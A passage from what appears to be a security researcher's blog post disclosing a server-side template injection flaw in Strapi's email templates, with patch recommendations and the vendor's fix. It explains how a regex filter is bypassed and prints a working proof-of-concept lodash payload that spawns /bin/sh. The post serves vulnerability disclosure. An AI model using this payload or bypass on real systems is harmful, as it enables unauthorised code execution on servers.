+<span class="kd">const</span><span class="w"> </span><span class="nx">invalidPatternsRegexes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="sr">/&lt;%[^=]([^&lt;&gt;%]*)%&gt;/m</span><span class="p">,</span><span class="w"> </span><span class="sr">/\${([^{}]*)}/m</span><span class="p">];</span><span class="w"></span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">authorizedKeys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'ADMIN_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'SERVER_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'CODE'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER.email'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER.username'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'TOKEN'</span><span class="p">,</span><span class="w"></span>
+<span class="p">];</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">matchAll</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="nx">src</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span><span class="w"></span>
+<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="s1">'g'</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// eslint-disable-next-line no-cond-assign</span><span class="w"></span>
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">src</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="nx">group</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="nx">matches</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">trim</span><span class="p">(</span><span class="nx">group</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">matches</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">isValidEmailTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">template</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">invalidPatternsRegexes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="sr">/&lt;%=([^&lt;&gt;%=]*)%&gt;/</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">matches</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">authorizedKeys</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">match</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">isValidEmailTemplate</span><span class="p">,</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ The
+ <code>
+  isValidEmailTemplate
+ </code>
+ preforms two checks for validating a submitted email template:
+</p>
+<ol>
+ <li>
+  It checks that only the
+  <code>
+   &lt;%= %&gt;
+  </code>
+  Lodash template delimiter is used by checking if there is a match to an invalid regex pattern (
+  <code>
+   [/&lt;%[^=]([^&lt;&gt;%]*)%&gt;/m, /\${([^{}]*)}/m]
+  </code>
+  ).
+ </li>
+</ol>
+<p>
+ <em>
+  Code snippet that checks only
+  <code>
+   &lt;%= %&gt;
+  </code>
+  delimiter is used
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">invalidPatternsRegexes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<ol start="2">
+ <li>
+  That the key name within the
+  <code>
+   &lt;%= %&gt;
+  </code>
+  delimiter is in the allow list named
+  <code>
+   authorizedKeys
+  </code>
+  .
+ </li>
+</ol>
+<p>
+ <em>
+  Code snippet that checks the key name is in an allow list
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="sr">/&lt;%=([^&lt;&gt;%=]*)%&gt;/</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">matches</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">authorizedKeys</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">match</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ So I had to bypass three different regex patterns.
+</p>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Regex Pattern
+   </th>
+   <th>
+    Purpose
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    <code>
+     /&lt;%[^=]([^&lt;&gt;%]*)%&gt;/m
+    </code>
+   </td>
+   <td>
+    Checks that
+    <code>
+     &lt;%= %&gt;
+    </code>
+    Lodash template delimiter is the only used delimiter in the template.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    <code>
+     /\${([^{}]*)}/m
+    </code>
+   </td>
+   <td>
+    Rejects using the ES template literal delimiter (example
+    <code>
+     ${ stuffHere }
+    </code>
+    ).
+   </td>
+  </tr>
+  <tr>
+   <td>
+    <code>
+     /&lt;%=([^&lt;&gt;%=]*)%&gt;/
+    </code>
+   </td>
+   <td>
+    Used for extracting the key names from each
+    <code>
+     &lt;%= %&gt;
+    </code>
+    delimiter and comparing to an allow list.
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ The first regex pattern I had no issues with, since I wanted to use the
+ <code>
+  &lt;%= %&gt;
+ </code>
+ delimiter for triggering my SSTI payload.
+</p>
+<p>
+ However, the second and third regex patterns were far more problematic. The SSTI RCE payload that I discussed in the previous section uses the characters
+ <code>
+  ${}
+ </code>
+ within the payload to evaluate JavaScript code, which was being blocked by the pattern
+ <code>
+  /\${([^{}]*)}/m
+ </code>
+ . Plus, to make things more challenging I had to find a way to trick the
+ <code>
+  /&lt;%=([^&lt;&gt;%=]*)%&gt;/
+ </code>
+ pattern to extract a key name in the allow list or
+ <strong>
+  nothing to skip the allow list check
+ </strong>
+ (
+ <em>
+  a little bit of foreshadowing
+ </em>
+ ).
+</p>
+<p>
+ Now if you are familiar with using regex patterns, you might of noticed that the patterns in
+ <code>
+  isValidEmailTemplate
+ </code>
+ are similar to the regex pattern for matching any text between delimiters (eg.
+ <code>
+  \${(.*?)}
+ </code>
+ will match to any text on a single line between
+ <code>
+  ${
+ </code>
+ and
+ <code>
+  }
+ </code>
+ ). In this can an exclude character list (eg.
+ <code>
+  [^{}]
+ </code>
+ ) when matching characters within text.
+</p>
+<p>
+ At a glance, these regex patterns appear to be fine.
+</p>
+<p>
+ <strong>
+  However, there is 1 tiny mistake in all of the regex patterns that allowed me to bypass these checks!
+ </strong>
+</p>
+<p>
+ The special regex character
+ <code>
+  *
+ </code>
+ <strong>
+  matches the previous token between zero and unlimited times
+ </strong>
+ . Looking at the regex patterns, the previous regex token in each of them is a
+ <strong>
+  character exclusion list
+ </strong>
+ . Therefore, characters in the exclusion list would
+ <strong>
+  break the grouping of text between the delimiters and results in not matching the regex patterns
+ </strong>
+ !
+</p>
+<p>
+ Okay I went a little bit technical there, so I will demonstrate using the
+ <code>
+  /\${([^{}]*)}/m
+ </code>
+ pattern. Using
+ <a href="https://regex101.com/">
+  regex101
+ </a>
+ , the below screenshot shows that the pattern correctly identifies text between
+ <code>
+  ${}
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/correct_match.png"/>
+</p>
+<p>
+ Now if I add a character from the exclude list (
+ <code>
+  {
+ </code>
+ or
+ <code>
+  }
+ </code>
+ ) the
+ <strong>
+  regex pattern does not correctly match the text since it does not match the pattern
+  <code>
+   [^{}]*
+  </code>
+  !
+ </strong>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/ohno.png"/>
+</p>
+<p>
+ <strong>
+  The same issue occurs for the
+  <code>
+   /&lt;%=([^&lt;&gt;%=]*)%&gt;/
+  </code>
+  pattern used for extracting key names for comparison to the allow list.
+ </strong>
+</p>
+<p>
+ So if I included one of these characters
+ <code>
+  &lt;&gt;%=
+ </code>
+ in the key name between
+ <code>
+  &lt;%= %&gt;
+ </code>
+ then the
+ <strong>
+  filter will fail to extract my payload for comparison with allowed key names
+ </strong>
+ !
+</p>
+<p>
+ You can test it out yourself by running the following test code.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"lodash"</span><span class="p">);</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">authorizedKeys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'ADMIN_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'SERVER_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'CODE'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'USER'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'USER.email'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'USER.username'</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s1">'TOKEN'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="p">];</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">matchAll</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="nx">src</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span><span class="w"></span>
+<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="s1">'g'</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// eslint-disable-next-line no-cond-assign</span><span class="w"></span>
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">src</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="nx">group</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="nx">matches</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">trim</span><span class="p">(</span><span class="nx">group</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">matches</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">validKeyInTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">template</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="sr">/&lt;%=([^&lt;&gt;%=]*)%&gt;/</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">matches</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">authorizedKeys</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">match</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kd">let</span><span class="w"> </span><span class="nx">blockedTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;%= I am blocked %&gt;'</span><span class="p">;</span><span class="w"></span>
+<span class="kd">let</span><span class="w"> </span><span class="nx">bypassTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;%= I am not blocked because I have &lt;&gt;%=! %&gt;'</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">let</span><span class="w"> </span><span class="nx">tests</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">blockedTemplate</span><span class="p">,</span><span class="w"> </span><span class="nx">bypassTemplate</span><span class="p">];</span><span class="w"></span>
+
+<span class="nx">tests</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">template</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`template: </span><span class="si">${</span><span class="nx">template</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">validKeyInTemplate</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Bypassed the Regex Filter!'</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Was blocked :('</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">});</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/bypassing-name-check.png"/>
+</p>
+<h3 class="major" id="putting-it-all-together">
+ Putting it All Together
+</h3>
+<p>
+ Now that I had discovered a bypass for the regex filters in
+ <code>
+  isValidEmailTemplate
+ </code>
+ , I needed to reorganise my SSTI payload to bypass validation.
+</p>
+<p>
+ Firstly, the
+ <code>
+  lodash
+ </code>
+ SSTI payload in
+ <a href="https://twitter.com/rootxharsh/status/1268181937127997446?lang=en">
+  this tweet
+ </a>
+ is just a fancy way to execute
+ <code>
+  process.binding("spawn_sync").spawn
+ </code>
+ with the following Object as an input parameter.
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">file</span><span class="o">:</span><span class="w"> </span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nx">args</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"id"</span><span class="p">],</span><span class="w"></span>
+<span class="w">    </span><span class="nx">stdio</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="s2">"type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"pipe"</span><span class="p">,</span><span class="w"> </span><span class="s2">"readable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">"writable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="s2">"type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"pipe"</span><span class="p">,</span><span class="w"> </span><span class="s2">"readable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">"writable"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">]</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ Since JavaScript Objects can be declared using
+ <code>
+  {}
+ </code>
+ characters, I could bypass the regex pattern
+ <code>
+  /\${([^{}]*)}/m
+ </code>
+ by simply changing the input for
+ <code>
+  process.binding("spawn_sync").spawn
+ </code>
+ from a variable that is constructed within the payload to a single Object using
+ <code>
+  {}
+ </code>
+ (shown below).
+</p>
+<div class="codehilite">
+ <pre><span></span><code>&lt;%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","mkdir /tmp/strapi-confirm; touch /tmp/strapi-confirm/rce"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"}]}).output }` %&gt;
+</code></pre>
+</div>
+<p>
+ Finally to bypass validating the key names for the template delimiters, I simply whacked
+ <code>
+  /*&lt;&gt;%=*/
+ </code>
+ into the payload. The
+ <code>
+  /*
+ </code>
+ and
+ <code>
+  */
+ </code>
+ characters are multiline comments in JavaScript that ignore any text between the comments. Therefore, I could whack any of the characters in the character exclusion list in
+ <code>
+  /&lt;%=([^&lt;&gt;%=]*)%&gt;/
+ </code>
+ so the payload would not be compared to the allow list for valid key names.
+</p>
+<p>
+ <em>
+  The final POC payload
+ </em>
+</p>
+<div class="codehilite">
+ <pre><span></span><code>&lt;%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","mkdir /tmp/strapi-confirm; touch /tmp/strapi-confirm/rce"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*&lt;&gt;%=*/}]}).output }` %&gt;
+</code></pre>
+</div>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="my-recommendation-for-patching-the-vulnerability">
+ My Recommendation for Patching the Vulnerability
+</h2>
+<p>
+ Now an
+ <em>
+  obvious
+ </em>
+ patch for this vulnerability would be to fix the regex filter patterns in
+ <code>
+  isValidEmailTemplate
+ </code>
+ to correctly block the SSTI payload.
+ <strong>
+  In my opinion, this is the wrong approach for fixing this SSTI vulnerability.
+ </strong>
+</p>
+<p>
+ Whenever you are planning a patch to fix a security vulnerability, you always need to have an understanding of the
+ <strong>
+  context of the functionality of the vulnerable component
+ </strong>
+ and
+ <strong>
+  evaluate the risk of implementing each patch strategy
+ </strong>
+ .
+</p>
+<p>
+ So going back to why simply fixing the regex patterns in
+ <code>
+  isValidEmailTemplate
+ </code>
+ is a bad idea, it is because it does not eliminate the risk that a malicious payload gets successfully rendered using the
+ <code>
+  lodash
+ </code>
+ template engine in
+ <code>
+  sendTemplatedEmail
+ </code>
+ . In the future, someone else could find a different bypass for the new filter and be able to exploit the SSTI vulnerability in
+ <code>
+  sendTemplatedEmail
+ </code>
+ .
+</p>
+<p>
+ Instead I recommended that Strapi should
+ <strong>
+  completely remove using the
+  <code>
+   lodash
+  </code>
+  template engine for rendering email templates
+ </strong>
+ . Reading the source code, my understanding of the functionality was to replace placeholders within an email template with string values. Using a template engine to achieve this functionality is overkill, and the same functionality could be achieved by preforming a string replace operation.
+</p>
+<p>
+ However, there is still a risk to replacing placeholders within emails using user supplied values. If HTML special characters are not filtered when they are inserted into the template, then you could potentially modify the content of an email with a completely different message than the original one in the template. This new vulnerability could then be used as a vector for social engineering by constructing phishing emails that are sent from an email address owned by an organisation.
+</p>
+<p>
+ Therefore, my final recommendation to Strapi was to replace using the
+ <code>
+  lodash
+ </code>
+ template engine in
+ <code>
+  sendTemplatedEmail
+ </code>
+ with a string replace method that also sanitise HTML characters in user inputs.
+</p>
+<h3 class="major" id="til-logic-less-template-engines-exist">
+ TIL: Logic-less Template Engines Exist
+</h3>
+<p>
+ After I provided my recommendation and Strapi patched the vulnerability (explained in the next section), I was made aware of Logic-less Template Engines for NodeJS (eg.
+ <a href="https://github.com/janl/mustache.js/">
+  <code>
+   Mustache.js
+  </code>
+ </a>
+ and
+ <a href="https://www.npmjs.com/package/micromustache">
+  <code>
+   micromustache
+  </code>
+ </a>
+ ). Logic-less Template Engines are a type of template engine that only replaces tags with values and does not allow the execution of code. A Logic-less Template Engine would of been an ideal solution for patching this vulnerability, and I would of recommended it if I knew about them at the time of reporting this vulnerability.
+</p>
+<p>
+ <strong>
+  If you are concerned about SSTI vulnerabilities and only need to replace tag values, then I highly recommend using Logic-less template engines.
+ </strong>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="how-strapi-fixed-the-vulnerability_1">
+ How Strapi Fixed the Vulnerability
+</h2>
+<p>
+ The Strapi development team decided to continue using the
+ <code>
+  lodash
+ </code>
+ template engine, but implement more stringent security controls and filters to prevent exploitation of SSTI via email templates. I expressed my reservations to Strapi about continuing to use the
+ <code>
+  lodash
+ </code>
+ template engine. However, I do understand that this strategy was the best approach for maintaining backwards compatibility and preventing a breaking change to the email functionality. Derrick from Strapi provided me access to the patch that was released as a nightly build with the commit ID
+ <a href="https://github.com/strapi/strapi/tree/0458e88bce7060b72450181eff292900135c82e1">
+  <code>
+   0458e88bce7060b72450181eff292900135c82e1
+  </code>
+ </a>
+ .
+</p>
+<p>
+ <em>
+  Now, let's see how Strapi fixed the vulnerability.
+ </em>
+</p>
+<h3 class="major" id="setting-strict-delimiter-regex-patterns-for-template-engines-to-prevent-evaluating-unintended-blocks">
+ Setting Strict Delimiter Regex Patterns for Template Engines to Prevent Evaluating Unintended Blocks
+</h3>
+<p>
+ First let's look at the changes made to the
+ <code>
+  sendTemplatedEmail
+ </code>
+ function.
+</p>
+<p>
+ <em>
+  Changes to the
+  <code>
+   sendTemplatedEmail
+  </code>
+  function
+ </em>
+ <br/>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/sendTemplatedEmail-changes.png"/>
+</p>
+<p>
+ The
+ <code>
+  sendTemplatedEmail
+ </code>
+ now sets the
+ <code>
+  interpolate
+ </code>
+ option for the
+ <code>
+  lodash
+ </code>
+ template engine and the
+ <code>
+  evaluate
+ </code>
+ option. The
+ <code>
+  interpolate
+ </code>
+ option is for specifying the regex pattern for determining the
+ <code>
+  interpolate
+ </code>
+ delimiter that the
+ <code>
+  lodash
+ </code>
+ template engine would use, which is now created by a new function called
+ <code>
+  createStrictInterpolationRegExp
+ </code>
+ that is derived from the data that would is expected to be rendered (the
+ <code>
+  keysDeep
+ </code>
+ function). Let's take a closer look at these two functions.
+</p>
+<p>
+ <a href="https://github.com/strapi/strapi/blob/0458e88bce7060b72450181eff292900135c82e1/packages/core/utils/lib/object-formatting.js">
+  <code>
+   packages/core/utils/lib/object-formatting.js
+  </code>
+ </a>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="s1">'use strict'</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">);</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">removeUndefined</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">_</span><span class="p">.</span><span class="nx">pickBy</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">'undefined'</span><span class="p">);</span><span class="w"></span>
+
